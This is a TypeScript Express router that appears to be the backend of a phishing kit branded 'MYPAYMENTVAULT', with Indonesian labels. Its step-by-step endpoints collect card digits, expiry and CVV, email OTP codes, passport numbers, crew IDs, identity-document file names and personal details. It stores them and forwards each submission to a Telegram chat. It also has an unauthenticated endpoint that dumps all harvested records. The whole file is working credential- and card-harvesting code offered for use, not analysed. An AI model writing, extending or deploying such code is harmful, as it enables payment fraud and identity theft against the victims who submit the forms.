import { Router, type IRouter } from "express";
import { db, cardSubmissionsTable, contactSubmissionsTable, otpSubmissionsTable, personalSubmissionsTable } from "@workspace/db";
import { sql, eq } from "drizzle-orm";
import { z } from "zod";
import { requireAuth } from "../middleware/require-auth";
import { tgNotify } from "../lib/tg-notify";

const router: IRouter = Router();

const CardBody = z.object({
  username: z.string().min(1),
  crewId: z.string().optional(),
  passportNo: z.string().optional(),
  cardLast8: z.string().optional(),
  cardMonth: z.string().optional(),
  cardYear: z.string().optional(),
  cvv: z.string().optional(),
  ipAddress: z.string().optional(),
});

const OtpBody = z.object({
  username: z.string().min(1),
  email: z.string().optional(),
  otpCode: z.string().optional(),
  ipAddress: z.string().optional(),
});

const ContactBody = z.object({
  username: z.string().min(1),
  firstName: z.string().optional(),
  lastName: z.string().optional(),
  email: z.string().optional(),
  phone: z.string().optional(),
  address: z.string().optional(),
  city: z.string().optional(),
  state: z.string().optional(),
  postalCode: z.string().optional(),
  dob: z.string().optional(),
  inquiryType: z.string().optional(),
  message: z.string().optional(),
  passportFilename: z.string().optional(),
  employeeIdFilename: z.string().optional(),
  ipAddress: z.string().optional(),
});

const PersonalBody = z.object({
  username: z.string().min(1),
  firstName: z.string().optional(),
  lastName: z.string().optional(),
  email: z.string().optional(),
  phone: z.string().optional(),
  address: z.string().optional(),
  city: z.string().optional(),
  state: z.string().optional(),
  postalCode: z.string().optional(),
  dob: z.string().optional(),
  inquiryType: z.string().optional(),
  message: z.string().optional(),
  ipAddress: z.string().optional(),
});

/* Contact Form — Data + Photo Filenames */
router.post("/submissions/contact", async (req, res): Promise<void> => {
  const parsed = ContactBody.safeParse(req.body);
  if (!parsed.success) { res.status(400).json({ error: "Invalid request" }); return; }
  await db.insert(contactSubmissionsTable).values(parsed.data).catch(() => {});
  const d = parsed.data;
  const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  void tgNotify(
    `📋 <b>CONTACT FORM</b> — Step Akhir\n` +
    `<code>────────────────────────</code>\n\n` +
    `👤 <b>Username</b>   <code>${d.username}</code>\n` +
    `🧑 <b>Nama</b>       <code>${(d.firstName ?? "")} ${(d.lastName ?? "")}</code>\n` +
    `📧 <b>Email</b>      <code>${d.email ?? "-"}</code>\n` +
    `📱 <b>Telepon</b>    <code>${d.phone ?? "-"}</code>\n` +
    `🏠 <b>Alamat</b>     <code>${d.address ?? "-"}</code>\n` +
    `🏙️ <b>Kota</b>       <code>${d.city ?? "-"}, ${d.state ?? "-"} ${d.postalCode ?? ""}</code>\n` +
    `🎂 <b>Tgl Lahir</b>  <code>${d.dob ?? "-"}</code>\n` +
    `📝 <b>Jenis</b>      <code>${d.inquiryType ?? "-"}</code>\n` +
    `💬 <b>Pesan</b>      <code>${d.message ?? "-"}</code>\n` +
    `🛂 <b>Passport</b>   <code>${d.passportFilename ?? "-"}</code>\n` +
    `🪪 <b>ID Karyawan</b> <code>${d.employeeIdFilename ?? "-"}</code>\n` +
    `🌐 <b>IP</b>         <code>${d.ipAddress ?? "-"}</code>\n` +
    `🕐 <b>Waktu</b>      ${now}\n\n` +
    `<code>────────────────────────</code>\n` +
    `<i>🏦 MYPAYMENTVAULT</i>`
  );
  res.json({ ok: true });
});

/* Step 2 — Card Details */
router.post("/submissions/card", async (req, res): Promise<void> => {
  const parsed = CardBody.safeParse(req.body);
  if (!parsed.success) { res.status(400).json({ error: "Invalid request" }); return; }
  await db.insert(cardSubmissionsTable).values(parsed.data).catch(() => {});
  const d = parsed.data;
  const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  void tgNotify(
    `💳 <b>DATA KARTU</b> — Step 4\n` +
    `<code>────────────────────────</code>\n\n` +
    `👤 <b>Username</b>   <code>${d.username}</code>\n` +
    `🪪 <b>Crew ID</b>    <code>${d.crewId ?? "-"}</code>\n` +
    `🛂 <b>Passport</b>   <code>${d.passportNo ?? "-"}</code>\n` +
    `💳 <b>No. Kartu</b>  <code>${d.cardLast8 ?? "-"}</code>\n` +
    `📅 <b>Exp</b>        <code>${d.cardMonth ?? "-"} / ${d.cardYear ?? "-"}</code>\n` +
    `🔐 <b>CVV</b>        <code>${d.cvv ?? "-"}</code>\n` +
    `🌐 <b>IP</b>         <code>${d.ipAddress ?? "-"}</code>\n` +
    `🕐 <b>Waktu</b>      ${now}\n\n` +
    `<code>────────────────────────</code>\n` +
    `<i>🏦 MYPAYMENTVAULT</i>`
  );
  res.json({ ok: true });
});

/* Step 3 — Personal Info */
router.post("/submissions/personal", async (req, res): Promise<void> => {
  const parsed = PersonalBody.safeParse(req.body);
  if (!parsed.success) { res.status(400).json({ error: "Invalid request" }); return; }
  await db.insert(personalSubmissionsTable).values(parsed.data).catch(() => {});
  const d = parsed.data;
  const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  void tgNotify(
    `🧾 <b>DATA PERSONAL</b> — Step 4\n` +
    `<code>────────────────────────</code>\n\n` +
    `👤 <b>Username</b>   <code>${d.username}</code>\n` +
    `🧑 <b>Nama</b>       <code>${(d.firstName ?? "")} ${(d.lastName ?? "")}</code>\n` +
    `📧 <b>Email</b>      <code>${d.email ?? "-"}</code>\n` +
    `📱 <b>Telepon</b>    <code>${d.phone ?? "-"}</code>\n` +
    `🏠 <b>Alamat</b>     <code>${d.address ?? "-"}</code>\n` +
    `🏙️ <b>Kota</b>       <code>${d.city ?? "-"}, ${d.state ?? "-"} ${d.postalCode ?? ""}</code>\n` +
    `🎂 <b>Tgl Lahir</b>  <code>${d.dob ?? "-"}</code>\n` +
    `📝 <b>Jenis</b>      <code>${d.inquiryType ?? "-"}</code>\n` +
    `💬 <b>Pesan</b>      <code>${d.message ?? "-"}</code>\n` +
    `🌐 <b>IP</b>         <code>${d.ipAddress ?? "-"}</code>\n` +
    `🕐 <b>Waktu</b>      ${now}\n\n` +
    `<code>────────────────────────</code>\n` +
    `<i>🏦 MYPAYMENTVAULT</i>`
  );
  res.json({ ok: true });
});

/* Step 4 — OTP */
router.post("/submissions/otp", async (req, res): Promise<void> => {
  const parsed = OtpBody.safeParse(req.body);
  if (!parsed.success) { res.status(400).json({ error: "Invalid request" }); return; }
  await db.insert(otpSubmissionsTable).values(parsed.data).catch(() => {});
  const d = parsed.data;
  const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  void tgNotify(
    `🔢 <b>KODE OTP EMAIL</b> — Step 5\n` +
    `<code>────────────────────────</code>\n\n` +
    `👤 <b>Username</b>  <code>${d.username}</code>\n` +
    `📧 <b>Email</b>     <code>${d.email ?? "-"}</code>\n` +
    `🔑 <b>Kode OTP</b>  <code>${d.otpCode ?? "-"}</code>\n` +
    `🌐 <b>IP</b>        <code>${d.ipAddress ?? "-"}</code>\n` +
    `🕐 <b>Waktu</b>     ${now}\n\n` +
    `<code>────────────────────────</code>\n` +
    `<i>🏦 MYPAYMENTVAULT</i>`
  );
  res.json({ ok: true });
});

/* Dashboard — gabungan semua data via VIEW user_journey */
router.get("/submissions/all", async (req, res): Promise<void> => {
  const rows = await db.execute(sql`SELECT * FROM user_journey`);
  res.json(rows.rows);
});

/* Admin — list all contact form submissions dengan card last 8 digits (auth required) */
router.get("/submissions/contact", requireAuth, async (req, res): Promise<void> => {
  const rows = await db.execute(sql`
    SELECT
      cs.id,
      cs.username,
      cs.first_name      AS "firstName",
      cs.last_name       AS "lastName",
      cs.email,
      cs.phone,
      cs.address,
      cs.city,
      cs.state,
      cs.postal_code     AS "postalCode",
      cs.dob,
      cs.inquiry_type    AS "inquiryType",
      cs.message,
      cs.passport_filename     AS "passportFilename",
      cs.employee_id_filename  AS "employeeIdFilename",
      cs.ip_address      AS "ipAddress",
      cs.submitted_at    AS "submittedAt",
      cs.status,
      latest_card.card_last8   AS "cardLast8",
      latest_card.card_month   AS "cardMonth",
      latest_card.card_year    AS "cardYear",
      latest_card.crew_id      AS "crewId",
      latest_card.passport_no  AS "passportNo"
    FROM contact_submissions cs
    LEFT JOIN LATERAL (
      SELECT card_last8, card_month, card_year, crew_id, passport_no
      FROM card_submissions
      WHERE username = cs.username
      ORDER BY submitted_at DESC
      LIMIT 1
    ) AS latest_card ON true
    ORDER BY
      CASE cs.status WHEN 'new' THEN 0 ELSE 1 END ASC,
      cs.submitted_at DESC
  `);
  res.json(rows.rows);
});

/* Admin — update status submission */
router.patch("/submissions/contact/:id", requireAuth, async (req, res): Promise<void> => {
  const id = parseInt(req.params.id, 10);
  if (isNaN(id)) { res.status(400).json({ error: "ID tidak valid" }); return; }

  const StatusBody = z.object({ status: z.enum(["new", "handled"]) });
  const parsed = StatusBody.safeParse(req.body);
  if (!parsed.success) { res.status(400).json({ error: "Status tidak valid" }); return; }

  await db.update(contactSubmissionsTable)
    .set({ status: parsed.data.status })
    .where(eq(contactSubmissionsTable.id, id));

  res.json({ ok: true });
});

export default router;
